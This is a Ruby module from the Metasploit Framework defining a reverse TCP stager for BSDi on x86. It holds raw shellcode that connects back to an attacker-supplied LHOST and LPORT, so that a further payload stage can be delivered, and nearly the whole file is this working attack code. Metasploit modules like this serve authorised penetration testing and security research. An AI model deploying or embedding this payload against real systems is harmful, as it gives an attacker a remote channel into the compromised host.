##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'
require 'msf/core/handler/reverse_tcp'


###
#
# ReverseTcp
# ----------
#
# BSD reverse TCP stager.
#
###
module Metasploit3

	include Msf::Payload::Stager

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Reverse TCP Stager',
			'Description'   => 'Connect back to the attacker',
			'Author'        => 'skape',
			'License'       => MSF_LICENSE,
			'Platform'      => 'bsdi',
			'Arch'          => ARCH_X86,
			'Handler'       => Msf::Handler::ReverseTcp,
			'Stager'        =>
				{
					'Offsets' =>
						{
							'LHOST' => [ 0x1c, 'ADDR' ],
							'LPORT' => [ 0x23, 'n'    ],
						},
					'Payload' =>
						"\x89\xe5\x68\x00\x07\x00\xc3\xb8\x9a\x00\x00\x00\x99\x50\x89\xe6" +
						"\x52\x42\x52\x42\x52\x6a\x61\x58\xff\xd6\x97\x68\x7f\x00\x00\x01" +
						"\x68\x10\x02\xbf\xbf\x89\xe3\x6a\x10\x53\x57\x6a\x62\x58\xff\xd6" +
						"\xb0\x03\xb6\x0c\x52\x55\x57\xff\xd6\x5f\xc3"
				}
			))
	end

end
